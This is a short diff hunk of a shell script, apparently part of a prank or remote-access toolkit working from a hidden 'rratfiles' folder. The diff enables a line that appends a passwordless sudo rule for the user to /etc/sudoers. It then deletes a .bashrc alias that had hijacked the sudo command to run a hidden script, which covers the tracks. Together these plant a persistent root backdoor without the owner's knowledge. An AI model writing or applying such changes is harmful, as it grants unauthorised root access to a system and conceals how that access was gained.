@@ -18,7 +18,7 @@ touch "$USER_HOME/rratfiles/root"
 
 # We then add this little line into the sudoers file
 line="$SUDO_USER ALL=(ALL) NOPASSWD: ALL"
-# echo "$line" >> /etc/sudoers
+echo "$line" >> /etc/sudoers
 
 # And finally, we delete the alias created by des-troy
 sed -i "\#alias sudo='sudo ~/rratfiles/des-troy-r && sudo'#d" ".bashrc"
